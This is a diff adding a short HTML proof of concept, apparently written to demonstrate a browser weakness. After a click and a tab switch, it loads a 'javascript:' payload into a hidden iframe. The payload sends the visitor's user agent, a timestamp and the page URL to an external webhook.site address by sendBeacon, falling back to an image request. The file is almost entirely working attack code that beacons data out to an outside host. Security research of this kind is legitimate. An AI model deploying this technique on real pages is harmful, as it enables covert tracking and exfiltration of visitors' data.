@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Background Execution Webhook PoC</title>
+<style>
+  iframe { display:none; }
+  body { font-family:sans-serif; text-align:center; padding-top:80px; }
+</style>
+
+<script>
+let armed = false;
+
+document.addEventListener("click", () => {
+  armed = true;
+  console.log("Payload armed");
+});
+
+document.addEventListener("visibilitychange", () => {
+  if (document.hidden && armed) {
+
+    setTimeout(() => {
+
+      const payload =
+        "(function(){try{"
+        + "var data={"
+        + " event:'executed_after_tab_switch',"
+        + " ts:Date.now(),"
+        + " ua:navigator.userAgent,"
+        + " page:location.href"
+        + "};"
+        + "var url='https://webhook.site/40815ef5-1dac-4c51-836f-825210500754'"
+        + " + '?data=' + encodeURIComponent(JSON.stringify(data));"
+        + "try{"
+        + " if(!navigator.sendBeacon(url)){ throw 1; }"
+        + "}catch(e){"
+        + " (new Image()).src=url;"
+        + "}"
+        + "}catch(e){}})()";
+
+      document.getElementById("iframe").src = "javascript:" + payload;
+
+    }, 500);
+  }
+});
+</script>
+</head>
+
+<body>
+<h1>Click anywhere, then switch tab</h1>
+<iframe id="iframe"></iframe>
+</body>
+</html>
